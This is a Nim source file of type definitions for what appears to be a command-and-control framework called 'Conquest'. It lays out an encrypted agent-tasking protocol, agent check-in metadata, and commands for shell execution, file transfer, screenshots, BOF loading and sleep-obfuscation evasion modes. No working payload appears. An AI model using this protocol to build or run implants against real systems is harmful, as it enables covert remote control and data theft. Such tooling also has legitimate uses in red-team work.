import prompt
import tables
import times
import parsetoml

# Custom Binary Task structure
const   
    MAGIC* = 0x514E3043'u32     # Magic value: C0NQ
    VERSION* = 1'u8             # Version 1
    HEADER_SIZE* = 48'u8        # 48 bytes fixed packet header size

type 
    PacketType* = enum 
        MSG_TASK = 0'u8
        MSG_RESULT = 1'u8 
        MSG_REGISTER = 2'u8
        MSG_HEARTBEAT = 100'u8

    ArgType* = enum 
        STRING = 0'u8
        INT = 1'u8
        SHORT = 2'u8
        LONG = 3'u8
        BOOL = 4'u8 
        BINARY = 5'u8 

    HeaderFlags* = enum 
        # Flags should be powers of 2 so they can be connected with or operators
        FLAG_PLAINTEXT = 0'u16
        FLAG_ENCRYPTED = 1'u16
        FLAG_COMPRESSED = 2'u16
        FLAG_FRAGMENTED = 4'u16 

    CommandType* = enum 
        CMD_SLEEP = 0'u16
        CMD_SHELL = 1'u16
        CMD_PWD = 2'u16
        CMD_CD = 3'u16
        CMD_LS = 4'u16
        CMD_RM = 5'u16
        CMD_RMDIR = 6'u16
        CMD_MOVE = 7'u16
        CMD_COPY = 8'u16
        CMD_PS = 9'u16
        CMD_ENV = 10'u16 
        CMD_WHOAMI = 11'u16
        CMD_BOF = 12'u16
        CMD_DOWNLOAD = 13'u16
        CMD_UPLOAD = 14'u16
        CMD_SCREENSHOT = 15'u16

    StatusType* = enum 
        STATUS_COMPLETED = 0'u8
        STATUS_FAILED = 1'u8
        STATUS_IN_PROGRESS = 2'u8

    ResultType* = enum 
        RESULT_STRING = 0'u8 
        RESULT_BINARY = 1'u8
        RESULT_NO_OUTPUT = 2'u8

    ConfigType* = enum 
        CONFIG_LISTENER_UUID = 0'u8
        CONFIG_LISTENER_IP = 1'u8 
        CONFIG_LISTENER_PORT = 2'u8
        CONFIG_SLEEP_DELAY = 3'u8  
        CONFIG_PUBLIC_KEY = 4'u8
        CONFIG_PROFILE = 5'u8

    LogType* = enum 
        # LOG_INFO = "[ * ] "
        # LOG_ERROR = "[ - ] "
        # LOG_SUCCESS = "[ + ] "
        # LOG_WARNING = "[ ! ] "
        LOG_INFO = "[INFO] "
        LOG_ERROR = "[FAIL] "
        LOG_SUCCESS = "[DONE] "
        LOG_WARNING = "[WARN] "

    SleepObfuscationMode* = enum 
        EKKO = 0'u8 
        ZILEAN = 1'u8

# Encryption 
type    
    Uuid* = uint32
    Bytes* = seq[byte]
    Key* = array[32, byte]
    Iv* = array[12, byte]
    AuthenticationTag* = array[16, byte]
    Key16* = array[16, byte]

# Packet structure
type 
    Header* = object
        magic*: uint32              # [4 bytes ] magic value 
        version*: uint8             # [1 byte  ] protocol version
        packetType*: uint8          # [1 byte  ] message type 
        flags*: uint16              # [2 bytes ] message flags
        size*: uint32               # [4 bytes ] size of the payload body
        agentId*: Uuid              # [4 bytes ] agent id, used as AAD for encryptio
        seqNr*: uint32              # [4 bytes ] sequence number, used as AAD for encryption
        iv*: Iv                     # [12 bytes] random IV for AES256 GCM encryption
        gmac*: AuthenticationTag    # [16 bytes] authentication tag for AES256 GCM encryption

    TaskArg* = object 
        argType*: uint8             # [1 byte  ] argument type
        data*: seq[byte]            # variable length data (for variable data types (STRING, BINARY), the first 4 bytes indicate data length)

    Task* = object 
        header*: Header
        taskId*: Uuid               # [4 bytes ] task id
        listenerId*: Uuid           # [4 bytes ] listener id
        timestamp*: uint32          # [4 bytes ] unix timestamp
        command*: uint16            # [2 bytes ] command id 
        argCount*: uint8            # [1 byte  ] number of arguments
        args*: seq[TaskArg]         # variable length arguments

    TaskResult* = object 
        header*: Header 
        taskId*: Uuid               # [4 bytes ] task id
        listenerId*: Uuid           # [4 bytes ] listener id
        timestamp*: uint32          # [4 bytes ] unix timestamp
        command*: uint16            # [2 bytes ] command id 
        status*: uint8              # [1 byte  ] success flag 
        resultType*: uint8          # [1 byte  ] result data type (string, binary)
        length*: uint32             # [4 bytes ] result length
        data*: seq[byte]            # variable length result

# Checkin binary structure
type
    Heartbeat* = object 
        header*: Header            # [48 bytes ] fixed header
        listenerId*: Uuid          # [4 bytes  ] listener id
        timestamp*: uint32         # [4 bytes  ] unix timestamp

# Registration binary structure 
type 

    # All variable length fields are stored as seq[byte], prefixed with 4 bytes indicating the length of the following data
    AgentMetadata* = object 
        listenerId*: Uuid
        username*: seq[byte]
        hostname*: seq[byte]
        domain*: seq[byte]
        ip*: seq[byte]
        os*: seq[byte]
        process*: seq[byte]
        pid*: uint32
        isElevated*: uint8
        sleep*: uint32

    AgentRegistrationData* = object
        header*: Header
        agentPublicKey*: Key        # [32 bytes ] Public key of the connecting agent for key exchange
        metadata*: AgentMetadata

# Agent structure
type 
    Agent* = ref object 
        agentId*: string
        listenerId*: string 
        username*: string 
        hostname*: string
        domain*: string
        ip*: string
        os*: string
        process*: string
        pid*: int
        elevated*: bool 
        sleep*: int 
        tasks*: seq[Task]
        firstCheckin*: DateTime
        latestCheckin*: DateTime
        sessionKey*: Key

# Listener structure
type 
    Protocol* = enum
        HTTP = "http"

    Listener* = ref object of RootObj
        listenerId*: string
        address*: string
        port*: int
        protocol*: Protocol

# Context structures
type 
    KeyPair* = object 
        privateKey*: Key 
        publicKey*: Key

    Profile* = TomlValueRef

    Conquest* = ref object
        prompt*: Prompt
        dbPath*: string
        listeners*: Table[string, Listener]
        agents*: Table[string, Agent]
        interactAgent*: Agent
        keyPair*: KeyPair
        profile*: Profile

    AgentCtx* = ref object
        agentId*: string
        listenerId*: string
        ip*: string
        port*: int
        sleep*: int
        sessionKey*: Key
        agentPublicKey*: Key
        profile*: Profile
        
# Structure for command module definitions 
type
    Argument* = object 
        name*: string 
        description*: string 
        argumentType*: ArgType
        isRequired*: bool

    Command* = object 
        name*: string
        commandType*: CommandType
        description*: string 
        example*: string 
        arguments*: seq[Argument]
        dispatchMessage*: string
        execute*: proc(config: AgentCtx, task: Task): TaskResult {.nimcall.}
